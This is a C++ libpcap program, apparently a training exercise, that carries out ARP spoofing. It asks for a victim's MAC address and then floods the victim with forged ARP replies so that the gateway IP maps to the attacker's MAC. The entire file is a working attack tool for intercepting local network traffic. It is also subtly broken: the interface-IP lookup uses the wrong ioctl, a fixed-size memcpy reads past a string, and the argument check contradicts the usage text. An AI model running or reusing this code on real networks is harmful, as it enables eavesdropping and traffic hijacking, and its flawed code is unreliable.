#include <cstdio>
#include <pcap.h>
#include <net/if.h> // for ioctl third argument
#include <sys/ioctl.h> //for ioctl function
#include <sys/socket.h> //for socket
#include <sys/types.h> //for socket
#include <unistd.h> // for close function
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct Attacker final {
    Mac mac;//attacker_mac
    Ip ip;//attacker_ip
} Attacker;

int getAttacker_Mac(uint8_t *mac);
int getAttacker_IP(char *ip);
void getAttacker_info(char* interface);

Attacker attacker;

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);//for packet pcap_next_ex
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}


    // get attacker info
    //printf("getAttacker_info start\n");
    getAttacker_info(dev);
    printf("Attacker MAC = %s\n", std::string(attacker.mac).c_str());
    printf("Attacker IP = %s\n", std::string(attacker.ip).c_str());

    //get sender mac address(ARP Request)
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();//Mac("ff:ff:ff:ff:ff:ff") = Mac::broadcastMac()
    packet.eth_.smac_ = attacker.mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker.mac;
    packet.arp_.sip_ = htonl(attacker.ip);
    packet.arp_.tmac_ = Mac::nullMac();//Mac("00:00:00:00:00:00") = Mac::nullMac()
    packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
	}

    //get sender mac address(ARP Reply)
    EthArpPacket reply_packet;

    while(1){
        struct pcap_pkthdr* header;
        const u_char* pcap_packet;
        res = pcap_next_ex(handle, &header, &pcap_packet);
        if(res==0)
            continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        reply_packet = *(EthArpPacket*)pcap_packet;
        if(reply_packet.eth_.type_ == htons(EthHdr::Arp)){
            if(reply_packet.arp_.op_ == htons(ArpHdr::Reply)){
                printf("ARP Reply!\n\n");
                break;
            }
        }
        sleep(2);
    }

    //ARP Spoofing
    uint8_t sender_mac[6] = {0, };//MAC_ALEN=6
    memcpy(sender_mac, &reply_packet.arp_.smac_, 6);

    EthArpPacket spoofing_packet;

    spoofing_packet.eth_.dmac_ = Mac(sender_mac);
    spoofing_packet.eth_.smac_ = attacker.mac;
    spoofing_packet.eth_.type_ = htons(EthHdr::Arp);

    spoofing_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    spoofing_packet.arp_.pro_ = htons(EthHdr::Ip4);
    spoofing_packet.arp_.hln_ = Mac::SIZE;
    spoofing_packet.arp_.pln_ = Ip::SIZE;
    spoofing_packet.arp_.op_ = htons(ArpHdr::Reply);
    spoofing_packet.arp_.smac_ = attacker.mac;
    spoofing_packet.arp_.sip_ = htonl(Ip(argv[3]));//argv[3]=target_ip
    spoofing_packet.arp_.tmac_ = Mac(sender_mac);
    spoofing_packet.arp_.tip_ = htonl(Ip(argv[2]));//argv[2]=sender_ip

    //send spoofing arp reply packet
    while(1){
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofing_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("ARP Spoofing\n");
        sleep(1);
    }

	pcap_close(handle);
}

void getAttacker_info(char* interface)
{
    uint8_t attacker_mac[6];//MAC_ALEN=6
    char attacker_ip[20];

    struct ifreq ifr;
    int sock;

    //open network interface socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);//AF_INET or AF_PACKET, SOCK_DGRAM or SOCK_STREAM
    if(sock < 0){
        perror("Fail to socket()");
        close(sock);
        exit(-1);
    }

    //check the mac address of the network interface
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);//strcpy(ifr.ifr_name, interface); -> warning
    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0){
        perror("Fail ioctl() to get interface MAC address");
        close(sock);
        exit(-1);
    }
    memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);

    //check the ip address of the network interface
    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0){
        perror("Fail ioctl() to get interface IP address");
        close(sock);
        exit(-1);
    }
    struct sockaddr_in *addr;
    addr = (struct sockaddr_in*)&ifr.ifr_addr;
    memcpy(attacker_ip, inet_ntoa(addr->sin_addr), sizeof(ifr.ifr_addr));
    //inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, attacker_ip, sizeof(struct sockaddr));

    //close network interface socket
    close(sock);

    attacker.mac = Mac(attacker_mac);
    attacker.ip = Ip(attacker_ip);
}
